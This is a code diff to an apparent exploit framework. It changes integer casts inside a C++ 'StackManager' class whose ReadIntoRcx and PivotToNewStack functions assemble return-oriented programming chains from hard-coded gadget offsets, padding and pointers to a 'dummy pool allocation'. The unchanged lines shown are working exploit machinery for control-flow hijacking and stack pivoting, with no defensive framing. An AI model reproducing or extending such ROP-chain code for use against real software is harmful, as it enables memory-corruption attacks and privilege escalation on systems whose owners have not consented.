@@ -48,10 +48,10 @@ void StackManager::ReadIntoRcx(const std::uint64_t ReadAddress)
     // to a valid memory dummy pool so that it writes there.
     this->AddGadget(0xbac765, "mov rdx, qword ptr \[rsp \+ 0x10\]; add rsp, 0x20; ret;");
     this->AddPadding(0x10);
-    this->AddValue((uint64_t)Globals::DummyMemoryAllocation, "rdx = dummy pool allocation");
+    this->AddValue((std::uint64_t)Globals::DummyMemoryAllocation, "rdx = dummy pool allocation");
     this->AddPadding(0x8);
     this->AddGadget(0xb7b925, "pop r8; add rsp, 0x20; pop rbx; ret;");
-    this->AddValue((uint64_t)Globals::DummyMemoryAllocation, "r8 = dummy pool allocation");
+    this->AddValue((std::uint64_t)Globals::DummyMemoryAllocation, "r8 = dummy pool allocation");
     this->AddPadding(0x28);
     this->AddGadget(0xa9b72d, "mov rcx, r9; mov qword ptr \[[a-zA-Z0-9]{2,3}\], [a-zA-Z0-9]{2,3}; ret;");
 }
@@ -149,10 +149,10 @@ void StackManager::PivotToNewStack(StackManager* NewStack)
     // to a valid memory dummy pool so that it writes there.
     this->AddGadget(0xbac765, "mov rdx, qword ptr \[rsp \+ 0x10\]; add rsp, 0x20; ret;");
     this->AddPadding(0x10);
-    this->AddValue((uint64_t)Globals::DummyMemoryAllocation, "rdx = dummy pool allocation");
+    this->AddValue((std::uint64_t)Globals::DummyMemoryAllocation, "rdx = dummy pool allocation");
     this->AddPadding(0x8);
     this->AddGadget(0xb7b925, "pop r8; add rsp, 0x20; pop rbx; ret;");
-    this->AddValue((uint64_t)Globals::DummyMemoryAllocation, "r8 = dummy pool allocation");
+    this->AddValue((std::uint64_t)Globals::DummyMemoryAllocation, "r8 = dummy pool allocation");
     this->AddPadding(0x28);
     this->AddGadget(0xa9b72d, "mov rcx, r9; mov qword ptr \[[a-zA-Z0-9]{2,3}\], [a-zA-Z0-9]{2,3}; ret;");
 
@@ -199,10 +199,10 @@ void StackManager::PivotToNewStack(StackManager* NewStack)
         this->AddPadding(0x28);
     this->AddGadget(0xbac765, "mov rdx, qword ptr \[rsp \+ 0x10\]; add rsp, 0x20; ret;");
     this->AddPadding(0x10);
-    this->AddValue((uint64_t)Globals::DummyMemoryAllocation, "rdx = dummy pool allocation");
+    this->AddValue((std::uint64_t)Globals::DummyMemoryAllocation, "rdx = dummy pool allocation");
     this->AddPadding(0x8);
     this->AddGadget(0xb7b925, "pop r8; add rsp, 0x20; pop rbx; ret;");
-    this->AddValue((uint64_t)Globals::DummyMemoryAllocation, "r8 = dummy pool allocation");
+    this->AddValue((std::uint64_t)Globals::DummyMemoryAllocation, "r8 = dummy pool allocation");
     this->AddPadding(0x28);
     this->AddGadget(0xa9b72d, "mov rcx, r9; mov qword ptr \[[a-zA-Z0-9]{2,3}\], [a-zA-Z0-9]{2,3}; ret;");
     // r11=rcx
